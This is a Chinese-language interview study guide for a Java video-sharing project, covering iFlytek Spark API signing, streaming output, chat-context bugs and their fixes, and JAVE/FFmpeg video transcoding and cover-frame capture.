| 一对多连接被覆盖 → 关一个标签页连带删另一个 | `WebSocketHandler:156-161` | 🟠 高 | `userId → Set<sessionId>` |
| 无心跳保活、无自动重连 | 前后端均缺 | 🟠 高 | 30s 心跳 + 指数退避重连 |
| 无 ACK / 推送失败不落库 | `WebSocketHandler:117-120` | 🟠 高 | 失败落离线消息 + 客户端 ACK |
| 单条消息 8KB 上限未调 | 无 `ServletServerContainerFactoryBean` | 🟡 中 | 调大缓冲区或分片推送 |
| 路径断言 `/ljl/chat` 与端点 `/ljl/bilibili/chat` 不一致 | 网关 yml vs `WebSocketConfig` | 🟠 高 | 核实并统一（否则是**死路由**） |

---

## 第 18 章 讯飞星火 API —— 集成大模型功能

### 18.1 在这个项目里它扮演什么角色

**一句话**：讯飞星火是这个项目的 **AI 能力提供方**，项目集成了它的**三套 API**，做出三条 AIGC 子链路。

**三套 API（必须背下来）**

| 能力 | 接口 | 协议 | 鉴权方式 | 落点 |
|---|---|---|---|---|
| **文生文**（AI 助手对话） | `wss://spark-api.xf-yun.com/v3.5/chat` | **WebSocket** | **HMAC-SHA256 签名放 URL query** | `BigModelHandler` |
| **文生图** | `https://spark-api.cn-huabei-1.xf-yun.com/v2.1/tti` | HTTP POST | **HMAC-SHA256 签名放 URL query**（`MyUtil.getAuthUrl`） | `ChatServiceImpl.getImage` |
| **生成 PPT 大纲** | `https://zwapi.xfyun.cn/api/aippt/createOutline` | HTTP POST | **appId + timestamp + signature 放 Header** | `ApiClient` / `ApiAuthAlgorithm` |

**三条子链路的业务流程**

```
① 文生文：用户和「星火API」这个虚拟好友聊天 → BigModelHandler 建 OkHttp WebSocket → 增量帧透传给浏览器
② 文生图：输入描述 → 直接出图 → 拿回 Base64 → 前端 <img :src="data:image/png;base64,...">
③ 文生 PPT：输入主题 → 两段式
   第一段：调 AIPPT createOutline 拿结构化大纲（含封面图 URL）
   第二段：对每个「子章节」起一个 PPTHandler，用星火对话把大纲扩写成 150 字详情
   最后：封装成 PPTWord{index, themeName, text} 列表返回
```

### 18.2 高频问答

**Q1 [必答] 星火的鉴权是怎么做的？（HMAC-SHA256 签名）**

- **考点**：**能否讲清签名算法而不是说「用了 SDK」**。这是最能区分"调过 API"和"理解 API"的一题。

- **答**（对着 `BigModelHandler.getAuthUrl` 五步讲）：
  ```java
  // ① 生成 RFC1123 格式的 GMT 时间
  SimpleDateFormat format = new SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss z", Locale.US);
  format.setTimeZone(TimeZone.getTimeZone("GMT"));
  String date = format.format(new Date());
  
  // ② 拼待签串：三段用 \n 连接
  String preStr = "host: " + uri.getHost() + "\n" +
                  "date: " + date + "\n" +
                  "GET " + uri.getPath() + " HTTP/1.1";
  
  // ③ HMAC-SHA256 签名，再 Base64
  Mac mac = Mac.getInstance("hmacsha256");
  mac.init(new SecretKeySpec(apiSecret.getBytes(UTF_8), "hmacsha256"));
  String sha = Base64.getEncoder().encodeToString(mac.doFinal(preStr.getBytes(UTF_8)));
  
  // ④ 拼 authorization 串
  String authorization = String.format(
      "api_key=\"%s\", algorithm=\"%s\", headers=\"%s\", signature=\"%s\"",
      apiKey, "hmac-sha256", "host date request-line", sha);
  
  // ⑤ 整串再 Base64 一次，连 date/host 一起 URL 编码，拼成 query
  String query = String.format("authorization=%s&date=%s&host=%s",
      URLEncoder.encode(Base64.getEncoder().encodeToString(authorization.getBytes(UTF_8)), "UTF-8"),
      URLEncoder.encode(date, "UTF-8"),
      URLEncoder.encode(uri.getHost(), "UTF-8"));
  return "wss://" + uri.getHost() + uri.getPath() + "?" + query;
  ```
  - **关键点逐条说明**：
    1. **为什么是 RFC1123 格式**：星火用的是**类 AWS Signature V4** 的签名规范，`date` 必须参与签名，格式必须严格匹配（`EEE, dd MMM yyyy HH:mm:ss z` + `Locale.US` + GMT 时区）。**少了 `Locale.US` 在中文环境下会格式化成中文星期，签名校验直接失败**——这是个经典坑。
    2. **为什么是 `\n` 连接三段**：这是 HTTP 请求的「规范化」写法，`headers="host date request-line"` 声明了参与签名的三个部分，**顺序必须和声明一致**。
    3. **为什么要 Base64 两次**：第一次是 HMAC 摘要转成可打印字符串；第二次是把整个 `authorization` 串编码（因为它含 `"`、`,`、`=` 等特殊字符，**直接放 URL 会破坏 query 结构**）。
    4. **为什么要 `URLEncoder.encode` 三次**：`date` 里有空格和逗号，`host` 理论上是域名但统一编码更安全。
  - **追问预警：为什么放 URL 而不是 header？**
    答：**浏览器 WebSocket API 无法自定义握手 header**（`new WebSocket(url)` 只接受 URL）。虽然我的后端是 OkHttp（理论上可以放 header），但**为了三套调用共用同一份 `getAuthUrl` 逻辑，统一走 query**。这是被客户端能力**倒逼**的设计。

**Q2 [进阶] 为什么待签串里是 `GET`，而文生图那边是 `POST`？**

- **考点**：**签名串必须和真实请求方法一致，这是最容易踩的坑。**

- **答**：
  - 星火的规范要求「**签名串里的 request-line 必须与实际请求方法一致**」。
  - **文生文（WebSocket）**：WebSocket 握手在星火侧被视为 **GET** 请求，所以 `BigModelHandler` 里写死 `"GET " + uri.getPath() + " HTTP/1.1"`。
  - **文生图（TTI）**：是标准的 **HTTP POST**，所以 `MyUtil.getAuthUrl` 里拼的是 `"POST " + uri.getPath() + " HTTP/1.1"`。
  - **写错的表现**：返回 **401 `HMAC signature cannot be verified`**。这个错误**不会提示你哪里写错了**，只能靠对比 demo 排查——**我踩过这个坑**。
  - **加分句**：**「这类签名方案的排查方法是：把待签串按规范逐字打印出来，对照官方文档的示例做 diff。因为签名是『全有或全无』的——多一个空格、少一个换行、大小写不对，结果都是 401，没有任何渐进提示。」**

**Q3 [深挖] 三套鉴权为什么写了三份实现？**

- **考点**：**代码重复的自觉 + 重构能力。**

- **答**（**诚实说，别辩解**）：
  - **事实**：`BigModelHandler.getAuthUrl`、`PPTHandler.getAuthUrl`、`MyUtil.getAuthUrl` **三份实现逻辑 90% 相同**，差别只有两处：**请求方法（GET/POST）**和 **`hostUrl`**。
  - **怎么造成的**：这是**复用官方 demo 代码**的结果——星火给的三个 demo 各自带一份签名方法，我直接拷进三个类里。**这是典型的「复制粘贴式复用」，是坏味道。**
  - **更糟的是**：`BigModelHandler` 和 `PPTHandler` 里**各写了一遍 `JsonParse` / `Header` / `Payload` / `Choices` / `Text` 内部类**（`BigModelHandler.java:201-248`），**也是纯复制**。这两个类还有几乎一样的 `run()`、`onMessage()`、`onFailure()`、`canAddHistory()`、`removeSession()`——**本质上是「同一个类复制两份，只改了 prompt 和字段名」**。
  - **正确重构**（要能说出具体方案）：
    ```java
    // ① 抽公共签名工具（一处实现，三处调用）
    public final class SparkAuthUtils {
        public static String buildSignedUrl(String host, String path,
                                            String method,      // "GET" / "POST"
                                            String apiKey, String apiSecret) { ... }
    }
    // 使用
    SparkAuthUtils.buildSignedUrl(host, path, "GET",  appId, apiSecret);   // 文生文
    SparkAuthUtils.buildSignedUrl(host, path, "POST", appId, apiSecret);   // 文生图
    
    // ② 抽公共 DTO（替换两份内部类）
    public class SparkResponse { Header header; Payload payload; }
    
    // ③ 用「一个通用 Handler + 不同配置」替代两个复制类
    public class SparkChatHandler extends WebSocketListener {
        private final SparkChatConfig config;   // prompt 模板、字数限制、回调
    }
    ```
    - **重构收益**：签名逻辑改动只需改一处（**避免「改了 A 忘了 B」**）；DTO 统一后新增能力（如接入星火 4.0）成本极低。
  - **为什么我当时没做**：说实话是**「能跑就先不动」**。三个 demo 分别调通后，抽公共类意味着要重新验证三条链路，当时优先做业务功能了。**这个取舍我认，但它是技术债，我在重构清单里排在第 4 位（质量类）。**

**Q4 [必答] 流式输出是怎么实现的？从星火到浏览器经过了哪些环节？**

- **答**（**讲清「三段流式」，只讲一段是初级**）：
  ```
  ① 星火 → 后端：OkHttp WebSocket 的 onMessage 回调，星火把一次回答拆成多帧推过来
  ② 后端内部：回调线程里解析 JsonParse，拿 payload.choices.text[].content 增量
  ③ 后端 → 浏览器：把 {status, type:"bigmodel", content} 通过映射表找到会话推回去
  前端按 status 决定：新建气泡(0) / 追加文字(1) / 收尾置成功(2)
  ```
  - **代码落点**：`BigModelHandler.onMessage`（`:103-153`）
    ```java
    JsonParse myJsonParse = gson.fromJson(text, JsonParse.class);
    Integer status = myJsonParse.header.status;                       // 0首/1中/2末
    List<Text> textList = myJsonParse.payload.choices.text;
    for (Text temp : textList) {
        JsonObject jsonText = new JsonObject();
        jsonText.addProperty("status",  status);
        jsonText.addProperty("type",    "bigmodel");
        jsonText.addProperty("content", temp.content);                // ★ 增量内容原样透传
        WEB_SOCKET_SESSION_CONCURRENT_MAP
            .get(USERID_TO_SESSIONID_MAP.get(userId))
            .sendMessage(new TextMessage(jsonText.toString()));
        totalAnswer = totalAnswer + temp.content;                     // 累积完整回答
    }
    if (myJsonParse.header.status == 2) { ... 落 historyList ... }    // 末帧收尾
    ```
  - **⚠️ 一个应该主动指出的坏味道**：`JsonParse`/`Header`/`Payload`/`Choices`/`Text` 这些 DTO 被写成了**非静态内部类**（`BigModelHandler.java:201` `class JsonParse {` —— 没有 `static`）。
    - **为什么这是问题**：非静态内部类**隐式持有外部类实例的引用**（编译器生成的 `this$0` 字段）。当作纯数据载体用时，这个引用**没有任何用处**，却带来两个后果：① 每个 DTO 实例都多一个引用字段，**无法脱离外部类实例独立存在**（这正好解释了为什么这些 DTO 没法抽到 `common` 复用——它们依附于 `BigModelHandler`）；② 如果外部类实例很大，**不当的引用保持会延长它的生命周期**。
    - **补充说明（要准确，别说成"必然失败"）**：Gson 内部是通过 `Unsafe.allocateInstance` 绕过构造器创建对象的，所以非静态内部类**未必**直接反序列化失败；但在某些 Gson 版本或**改用了带构造器/Record 的创建策略**（如 `@JsonAdapter`、Jackson 的 `ParameterNamesModule`）时会出问题，而且**它本来就违反了"DTO 应该能独立存在"的设计原则**。
    - **正确做法**：改成 **`static` 嵌套类或独立类**——这样才能抽到 `common` 里被 `BigModelHandler` 和 `PPTHandler` 共用，顺手解决上一条的重复问题。
    - **面试时怎么讲**：**「这些 DTO 我写成了非静态内部类，这是个坏味道——数据载体不需要持有外部类引用，而且正因为它持有引用，所以没能抽到公共模块，导致 `BigModelHandler` 和 `PPTHandler` 各写了一遍。改成 `static` 之后既消除了耦合，也顺手解决了重复。」**

**Q5 [必答] `header.status` 的 0/1/2 是什么？为什么要透传给前端？**

- **答**：
  - **语义**：星火约定 **0 = 首帧、1 = 中间帧、2 = 末帧**。
  - **为什么透传而不是后端合并成一条再发**：
    - 前端需要它**做 UI 状态机**：
      ```
      status=0 → push 一个新气泡，把 uuid 存到 conId（这一轮的会话标识）
      status=1 → 按 uuid 找到那个气泡，content += 增量
      status=2 → 追加最后一帧，把 success 置真（进度条收尾）
      ```
    - **如果后端合并后再发**，用户就要**盯着 loading 转 10 秒才能看到第一个字**。透传的核心价值是**首字延迟（TTFT）从 10 秒降到 1 秒左右**——这是 AI 应用和普通 CRUD 接口**最大的体验差异点**。
  - **追问预警：如果 status=0 那一帧在网络里丢了会怎样？**（**这题答好了很加分**）
    - **会整段回答丢失**。因为前端**只在 status=0 时创建气泡**，status=1/2 只做 `forEach` 匹配 `conId`——**匹配不到就静默丢弃**，用户看到「转了半天什么都没有」。
    - **根因**：**用「状态帧的位置」隐含表达「会话开始」，而不是显式协议**。这是协议设计的缺陷。
    - **修法**：① 给每轮回答分配 `serviceRequestId`，前端收到任何未知 requestId 的帧就**自动补建气泡**；② 或改成「**客户端先本地插入占位气泡，后端只负责追加**」，把创建权交给发起方。
  - **追问预警：前端那个 `conId = Date.now() + 123123131` 有问题吗？**
    - 它是**同一轮回答的会话标识**，作用是把后续帧归属到同一气泡。**问题有三个**：
      1. **后端完全没有回传 requestId**，前端只能用本地时间戳自己造。一旦同一用户**开两个标签页或快速连发两条**，`conId` 会被后一条覆盖，**前一条的增量帧全部追加到错误气泡上**；
      2. `Date.now()+常数` 的**碰撞概率不为零**；
      3. 正确做法是**前端生成 uuid 随请求带上，后端在每一条推回的消息里带上同一个 requestId**，前端按 requestId 精确路由。

**Q6 [进阶] 多轮上下文是怎么管理的？为什么是 12000 字符？**

- **答**：
  - **存在哪**：**服务进程内存里**——`BigModelHandler.historyList`（`List<RoleContent>`，元素是 `{role, content}`），而这个 Handler 实例又存在静态 `BIGMODEL_MAP<userId, BigModelHandler>` 里。也就是「**一个用户一份上下文，按 userId 索引，进程内独享**」。
  - **怎么控制长度**：`canAddHistory()` 把 `historyList` 里所有 `content.length()` 累加，超过 **12000** 就裁掉最旧的几轮。
    ```java
    public boolean canAddHistory() {
        int history_length = 0;
        for (RoleContent temp : historyList) { history_length += temp.content.length(); }
        if (history_length > 12000) {
            historyList.remove(0); historyList.remove(1); historyList.remove(2);
            historyList.remove(3); historyList.remove(4);
            return false;
        }
        return true;
    }
    ```
  - **为什么是 12000**：这是留出的**经验阈值**——星火 v3.5 的上下文窗口**按 token 计**，我把 `max_tokens` 设成 **8000**（输出上限），那么「历史 + 本次提问 + 输出」要一起塞进窗口，所以给历史留了余量。
  - **⚠️ 但这里我要主动说明三个问题**：
    1. **`String.length()` 数的是字符数，不是 token 数**。中文 1 个字约 **1-2 token**，英文 1 token ≈ 4 字符，**这个估算误差可能到 3 倍**。所以「12000 字符」对应的 token 数是不确定的，**可能在窗口内也可能超窗**。正确做法是用 **tokenizer 精确计数**（或用星火返回的 usage 字段），或者直接按「**保留最近 N 轮**」的轮数上限兜底。
    2. **裁剪逻辑是错的**（**这题是分水岭**）：
       ```java
       historyList.remove(0); historyList.remove(1); historyList.remove(2); ...
       ```
       **`ArrayList.remove(i)` 会使后续元素前移**，所以连续删 0~4 实际删掉的是**原索引 0、2、4、6、8**（第一次删 0 后，原 1 变成 0，但下一次删的是新索引 1 = 原索引 2），**中间保留了一半元素，语义完全混乱**。
       - 正确写法：`historyList.clear()` 清空，或 `while (size > N) removeFirst()`，或把 `ArrayList` 换成 **`ArrayDeque`** 做双端操作。
    3. **`removeSession()` 同样删不干净**：
       ```java
       for (int i = 0; i < historyList.size(); i++) historyList.remove(i);   // 只能删掉一半
       ```
       每删一次 `size` 就减一，循环条件同时收缩，结果只能删掉一半（下标 0、2、4…）。**应该是 `historyList.clear()`。**
  - **上下文放内存的致命问题**（**这题是整个模块最需要主动暴露的设计缺陷**）：
    1. **多实例失效**：chat 起两个副本时用户请求被负载均衡到不同实例，**上下文一半在一半在二**，模型表现随机变差；
    2. **重启即失忆**：发布一次全丢；
    3. **内存泄漏**：`BIGMODEL_MAP` 只增不减（`removeSession` 只清了 list，没清 map），长期运行会 OOM。
    - **改造方案**：会话上下文**外置到 Redis**——`key chat:ctx:{userId}`，`RPUSH` + `LTRIM` 保留最近 N 轮，设 TTL。这样多实例共享、重启不丢，还能顺手做「上下文长度」的可观测。
    - **加分句**：如果不用 Redis，退一步也可以**把上下文交给前端**（前端每次带最近几轮），服务端做成**无状态**——但缺点是请求体变大、且历史**可被篡改**。

**Q7 [进阶] 大模型调用失败了怎么处理？**

- **答**（**必须坦诚，因为当前实现是弱的**）：
  - **现状**：只在 `onFailure` 里打印日志，而且**有个致命问题**：响应码不是 101 时 **`System.exit(0)` 会把整个服务进程杀掉**（见第 17 章 Q6 的警告框）。
  - **该补齐的完整策略**：
    1. **错误分类**：**超时 / 502 / 429（限流）可重试**；**401（签名错）/ 400（参数错）不可重试**（重试多少次都是错的，只会浪费调用配额）；
    2. **指数退避重试**：1s → 2s → 4s，最多 3 次，**带随机抖动**（避免多个客户端同时重试造成二次雪崩）；
    3. **熔断**：项目里已引入 `sentinel-core 1.8.6`，可以给星火调用加熔断——**星火持续失败时快速失败**，避免线程被拖死（`getImage` 那个同步接口尤其需要）；
    4. **降级**：给用户一个「**AI 助手暂时不可用，请稍后重试**」的气泡，而不是让前端一直转圈；
    5. **可观测**：记录错误码分布、失败率、重试次数。
  - **加分句**：**「大模型是外部依赖里最不可控的一类——它可能慢（5-15 秒）、可能限流（429）、可能因你余额不足而失败（403）。所以我的原则是：把它当成『随时会挂的第三方』来设计，而不是当成『一定成功的方法调用』。这也意味着所有 AIGC 接口都必须有兜底文案和降级路径。」**

**Q8 [进阶] 星火有 QPS/并发配额，你怎么防超限？**

- **答**：
  - **现状**：**没有任何限制**，这是一个明显的缺口。项目里那个 `encode-count` 限流是给「视频转码」用的（而且实现是坏的，见第 6 章 Q3），**AIGC 这条链路完全没有限流**。
  - **方案（三个维度）**：
    1. **按用户维度限流**：每人**同时只能有 1 路对话**。因为 `BIGMODEL_MAP` 已经按 `userId` 隔离，**天然可以在「同一用户已有进行中的请求」时直接拒绝并发**：
       ```java
       if (handler.isInFlight()) { /* 提示"上一条还在生成中" */ }
       ```
    2. **按服务维度限流**：全局并发上限（信号量），超出**排队或直接提示**。用 `Semaphore` 或 Sentinel 的 `FlowRule`。
    3. **配额用满时降级**：走缓存答案或模板回答（比如常见问题走预设文案）。
    - **另外还要有「按用户日配额」**：因为这是**收费 API**，必须防刷（每人每天 N 次）。
    - **加分句**：**「AIGC 接口的限流和普通接口不一样——普通接口限流是为了保护自己，AIGC 限流还要保护『钱包』。所以除了 QPS，我还会加『token 消耗配额』和『按用户日调用次数』这两个业务维度的限制。」**

### 18.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **三套签名实现重复三份** | `BigModelHandler.getAuthUrl`、`PPTHandler.getAuthUrl`、`MyUtil.getAuthUrl` | 🟡 中 | 抽 `SparkAuthUtils.buildSignedUrl(host, path, method, ...)` |
| **DTO 内部类重复两遍且未 `static`** | `BigModelHandler:201-248`、`PPTHandler` | 🟡 中 | 抽公共 `static` DTO |
| **`canAddHistory` 删除索引错乱** | `BigModelHandler:78-82` | 🟠 高 | `while(size>N) removeFirst()` / `ArrayDeque` |
| **`removeSession` 只能删一半** | `BigModelHandler:305-307` | 🟠 高 | `historyList.clear()` |
| 字符数当 token 数，估算误差 3 倍 | `BigModelHandler:72-87` | 🟡 中 | tokenizer 精确计数 / 按轮数上限 |
| **上下文存内存，多实例失效 + OOM** | `BIGMODEL_MAP` + `historyList` | 🔴 致命 | 外置 Redis + TTL |
| `onFailure` 若无 101 帧则 `System.exit(0)` 杀进程 | `BigModelHandler:165`、`PPTHandler` | 🔴 致命 | 错误分类 + 退避 + 降级 |
| **apiKey/apiSecret 硬编码在常量类** | `chat/constant/Constant.java:17-19` | 🔴 致命 | Nacos 加密配置 / 环境变量 |
| **`getImage` 用 GET 且 prompt 拼进路径** | `ChatController.getImage/{text}` | 🟠 高 | 改 POST + body 传参 |
| **prompt 未转义直接拼 JSON** | `ChatServiceImpl:246-270` | 🟠 高 | 用 `JSONObject` 序列化 |
| **无重试 / 无熔断 / 无限流** | AIGC 全链路 | 🟠 高 | 分类重试 + Sentinel + 用户配额 |
| **同步生图占 Tomcat 线程（5-15 秒）** | `ChatController.getImage` | 🔴 致命 | 异步化 + WebSocket 回推 taskId |
| 采样率/成本无监控 | 全链路 | 🟡 中 | TTFT、token 数、失败率埋点 |

---

## 第 19 章 JAVE —— 视频操作（转码、压缩、截图、去水印）

### 19.1 在这个项目里它扮演什么角色

**一句话**：JAVE（Java Audio Video Encoder，**FFmpeg 的 Java 封装**）是这个项目的**视频处理引擎**，实际承担三件事：**截取封面帧**、**获取视频时长**、**转码成 H264**。

**依赖**：`ws.schild:jave-all-deps` **3.3.1**（`java/pom.xml:117-121`）—— **`all-deps` 包内含预编译的 FFmpeg 可执行文件**，所以**不需要单独安装 FFmpeg**。

**⚠️ 先做一个诚实的澄清（面试官会问）**

> **简历/README 上写的「转码、压缩、截图、去水印」，实际只实现了三项：「转码」「截图」「读时长」。「压缩」和「去水印」全项目不存在。**
>
> 我 grep 过整个仓库：**没有任何一处涉及水印（watermark）、也没有设置码率/分辨率做压缩**。`Encoder` 的调用只有一处（`VideoEncodeConsumer`），只设了 `setCodec("h264")`。
>
> **面试时主动说清这一点，比被追问时语塞好得多**，而且你可以顺势讲「如果要做去水印/压缩该怎么实现」（见 19.2-Q5），反而变成加分项。

**实际落点（两个模块分工）**

| 功能 | 位置 | 类 / 方法 |
|---|---|---|
| **截封面帧** | `video` 模块（首个分片时） | `ScreenExtractor.renderOneImage(multimediaObject, -1, -1, 1000, coverFile, 1)` |
| **截封面帧** | `notice` 模块（无封面时兜底） | 同上（`VideoEncodeConsumer:95-96`） |
| **读时长** | `notice` 模块 | `multimediaObject.getInfo().getDuration()` |
| **读编码格式** | `notice` 模块 | `multimediaObject.getInfo().getVideo().getDecoder()` |
| **转码 H264** | `notice` 模块 | `new Encoder().encode(multimediaObject, target, attrs)` |

### 19.2 高频问答

**Q1 [必答] 为什么要做视频转码？**

- **答**（**这题的关键是说出「浏览器的兼容性」这个真实动机**）：
  - **核心原因**：**浏览器对视频编码的支持差异**。项目文档注释里写得非常直白：
    ```java
    // VideoEncodeConsumer:134-136
    String rightFormat = "h264";
    // 不符合h264的mp4文件需要转码否则浏览器中只有声音没有图像
    if (!rightFormat.equals(videoInfo.getDecoder())) {
    ```
    **「只有声音没有图像」是 H.265（HEVC）视频在 Chrome/Edge 上的典型表现**——Chrome 对 H.265 的支持长期依赖硬件解码，很多环境直接不支持视频轨。所以**上传上来的 H.265/其他编码 mp4，必须转成 H.264（AVC）**才能保证所有浏览器都能播。
  - **其他常见转码动机**（要能补充，体现视野）：
    1. **统一封装格式**：mp4 / flv / mov / avi / mkv 统一成 mp4；
    2. **压缩体积、降低码率**：原始视频码率可能几十 Mbps，转成自适应码率能省带宽（**B 站的多清晰度就是这个**）；
    3. **分辨率适配**：生成 360p/720p/1080p 多档，配合 HLS/DASH 做自适应码率（ABR）；
    4. **切片**：转成 HLS 的 `.ts` 分片 + `.m3u8` 索引，支持边下边播和拖动；
    5. **加水印 / 审核预处理**。
  - **我项目为什么用「异步 + MQ」**（把第 9 章串起来）：转码是 **CPU 密集 + 耗时长**（一个 100MB 的视频可能几十秒到几分钟）。如果同步做，用户点「投稿」要等 1 分钟，HTTP 早就超时了。所以链路是：**投稿立刻返回 → 发 MQ `video-encode` → 消费者异步转码 → 转码完回传覆盖**。
  - **追问预警：转码期间用户看到的是什么？**
    - 现状是**用户在投稿成功后立刻就能看到视频**（因为 `video.url` 已经指向原始文件），转码完成后**用同名对象覆盖**（`videoClient.uploadVideo(customMultipartFile)` 上传的文件名取自 `uploadVideo.getUrl()` 的最后一段，也就是**覆盖原对象**）。
    - **⚠️ 这有两个问题**：① **转码期间播放可能失败**（原文件是 H.265，浏览器播不了）；② **覆盖原对象有风险**——如果转码产物有问题，**原始文件已经被覆盖，无法回滚**。
    - **正确做法**：转码产物先上传到**新对象名**（如 `{name}_h264.mp4`），转码成功并校验后再**更新数据库的 url 指向新对象**（**数据库切换是原子的**），确认无误后再异步删除原文件。这是「**先写新数据再切指针**」的通用安全模式。

**Q2 [必答] JAVE 的核心 API 讲一下。**

- **答**（对着项目代码讲，四件套：`MultimediaObject` / `Encoder` / `EncodingAttributes` / `VideoAttributes`+`AudioAttributes`）：
  ```java
  // ① 多媒体对象：视频文件的入口
  MultimediaObject multimediaObject = new MultimediaObject(new File("input.mp4"));
  
  // ② 读取元信息（不需要转码，只读头信息）
  MultimediaInfo info = multimediaObject.getInfo();
  VideoInfo  videoInfo = info.getVideo();
  String  decoder  = videoInfo.getDecoder();       // 编码格式，如 "h264" / "hevc"
  Integer width    = videoInfo.getSize().getWidth();
  Integer bitRate  = videoInfo.getBitRate();
  Long    duration = info.getDuration();           // ★ 毫秒，注意单位！
  AudioInfo audioInfo = info.getAudio();
  
  // ③ 截帧（ScreenExtractor）
  ScreenExtractor screenExtractor = new ScreenExtractor();
  screenExtractor.renderOneImage(
      multimediaObject,
      -1,      // width：-1 = 保持原宽
      -1,      // height：-1 = 保持原高
      1000,    // ★ milliseconds：截第 1000 毫秒（第 1 秒）处的那一帧
      coverFile,  // 输出文件
      1        // 输出图片数量
  );
  
  // ④ 转码（Encoder + EncodingAttributes）
  VideoAttributes videoAttrs = new VideoAttributes();
  videoAttrs.setCodec("h264");                     // ★ 目标视频编码
  // videoAttrs.setBitRate(...);                   // 码率（压缩用，项目里没设）
  // videoAttrs.setSize(new VideoSize(1280, 720)); // 分辨率（压缩用，项目里没设）
  AudioAttributes audioAttrs = new AudioAttributes();
  // audioAttrs.setCodec("aac"); audioAttrs.setBitRate(...);
  EncodingAttributes attrs = new EncodingAttributes();
  attrs.setOutputFormat("mp4");                    // ★ 目标封装格式
  attrs.setVideoAttributes(videoAttrs);
  attrs.setAudioAttributes(audioAttrs);
  new Encoder().encode(multimediaObject, target, attrs);   // ★ 同步阻塞调用
  ```
  - **进程模型（必须讲清，这是 JAVE 的核心特征）**：
    - JAVE **不是纯 Java 实现**，它是 **FFmpeg 命令行程序的 Java 封装**。`Encoder.encode()` 内部会**启动一个 FFmpeg 子进程**（`java -jar` → `ffmpeg -i input -c:v h264 ... output`），然后把 FFmpeg 的**标准输出/错误流读回来解析**（`Encoder` 实现了 `EncoderProgressListener`，可以从 FFmpeg 输出里解析进度百分比）。
    - **`jave-all-deps` 里打包了各平台的 FFmpeg 可执行文件**（Windows/macOS/Linux），运行时**自动解压到临时目录**并调用。**这意味着**：① 不用自己装 FFmpeg；② **但 jar 体积会很大**（notice 那个 jar 有 **265MB**，video 有 **262MB**，主要就是 jave-all-deps）；③ 容器镜像里要注意 `/tmp` 的**可执行权限**（`noexec` 挂载会导致失败）。
    - **`all-deps` vs 普通 `jave-core`**：`jave-core` 只含 Java 代码，需要**自己装 FFmpeg**；`jave-all-deps` 含二进制。**生产更推荐 `jave-core` + 镜像里预装 FFmpeg**——镜像更小、FFmpeg 版本可控、能做安全更新。**我项目里用 all-deps 是图方便，代价是 260MB 的镜像体积。**
  - **两个必须注意的细节**：
    1. **`getDuration()` 返回毫秒**，而项目里做了 `/1000` 转秒：
       ```java
       Integer totalLength = Math.toIntExact(multimediaObject.getInfo().getDuration()) / 1000;
       ```
       **`Math.toIntExact` 对超过 `Integer.MAX_VALUE` 的毫秒数会抛 `ArithmeticException`**。一个视频最多 `2^31` 毫秒 ≈ **24.8 天**，实际视频不会超，所以这里安全；但**语义上应该用 `long` 再用 `Duration` 格式化**。
    2. **时长格式化用的是手写分支**（`VideoEncodeConsumer:109-127`）：
       ```java
       if (totalLength / 60 < 1) {
           if (totalLength % 60 < 10) { length = "00:0" + totalLength; }
           else { length = "00:" + totalLength; }
       } else { ... 层层嵌套 ... }
       ```
       **这是典型的「该用工具的地方手写了」**——用 `java.time.Duration` 或 Hutool 的 `DateUtil.formatBetween` 一行就能搞定，而且手写版本**对「秒数只有 1 位要补 0」处理正确，但对「小时数 > 9」等情况没有覆盖**（比如 25 小时的视频）。**而且这个嵌套 if-else 有 18 行，可读性极差。**

**Q3 [进阶] 截帧为什么选第 1000 毫秒？**

- **答**：
  - **为什么要跳过开头**：视频**第 0 帧经常是黑屏**（尤其是手机拍摄或剪辑软件导出的视频，开头有淡入效果）。直接截第 0 帧会得到纯黑封面，用户体验很差。**截第 1 秒是为了避开淡入的黑帧**。
  - **这个做法的问题（要主动说）**：
    1. **🟠 第 1000 毫秒不一定有内容**：如果视频**总时长不足 1 秒**（比如几帧的动画），或者前 1 秒都是黑屏/转场，截出来还是黑的。**更稳健的做法是截「时长的 10%」或「时长的 1/3」，并做「非黑像素比例」检测，黑帧就往后挪**。
    2. **🟠 截帧发生在「第一个分片」**（`video` 模块的 `uploadPart`）：
       - 只把**第一个 6MB 分片**当作完整视频文件交给 `ScreenExtractor`。**这能工作是因为 moov atom（元数据）通常在文件开头**，FFmpeg 能读到时长并 seek 到第 1 秒（分片内已包含该位置的数据）。
       - **但如果 moov atom 在文件末尾**（某些编码器的默认行为，也是「未 faststart 的 mp4」的特征），**FFmpeg 会因为找不到元数据而无法 seek**，截帧要么失败要么得到第 0 帧。**修法是首片上传后用 `qt-faststart` 处理，或改在合并完成后截帧**。
    3. **🟡 每个分片都尝试截帧的判断条件不严谨**：
       ```java
       if (uploadPartMap.get(resumableIdentifier) == null || uploadPartMap.get(...).getHasCutImg() == false)
       ```
       意图是「只截一次」，但**并发场景下多个分片同时进入这个分支**（`get` 判断和 `setHasCutImg(true)` 之间没有同步），会**重复截帧**（浪费 CPU）。
  - **更好的实现方案**（讲这个体现工程能力）：
    ```java
    // 用 FFmpeg 的 thumbnail 滤镜，自动挑「代表性帧」（跳过黑帧/相似帧）
    ffmpeg -i input.mp4 -vf "thumbnail,scale=640:-1" -frames:v 1 cover.jpg
    // 或者按比例截 + 黑帧检测重试
    long target = Math.max(1000, duration / 10);
    ```
    **并且应该把截帧放在「合并完成后」而不是「首片到达时」**——理由：① 拿到的是完整文件，`moov` 一定可读；② 不和分片上传的并发逻辑耦合；③ 失败时可以重试整个文件而不是某个分片。

**Q4 [深挖] `VideoEncodeConsumer` 的转码实现有什么问题？**

- **考点**：**这题能同时考出「jave 理解」「MQ 消费模型」「资源管理」三层。**

- **答**（逐条）：
  1. **🔴 同步阻塞 + 无超时 → MQ 消费线程被长期占住**：`encoder.encode(...)` 是**同步阻塞**的（内部起 FFmpeg 子进程等它跑完）。一个 1GB 的视频转码可能**几分钟到十几分钟**。而 `ConsumeMode.ORDERLY` 会让这个 Queue **串行消费 + 加锁**——意味着**后续所有转码消息都在排队等它**。
     - **更糟的是没有超时**：如果 FFmpeg **卡死**（损坏的文件、不支持的编码），`encode()` 会**永久阻塞**，这个消费线程就废了。
     - **修法**：① FFmpeg 调用要加超时（JAVE 可以通过 `Encoder` 的进度监听 + 手工中断，或者更彻底地用 `Process` + `waitFor(timeout)`）；② 转码这种「重 CPU 任务」**不要用 MQ 消费线程直接跑**，应该**丢到独立线程池**，消费线程只负责「提交任务 + ACK」（**快速 ACK 避免阻塞队列**）；③ `consumeThreadMax` 要显式设小（见第 9 章）。
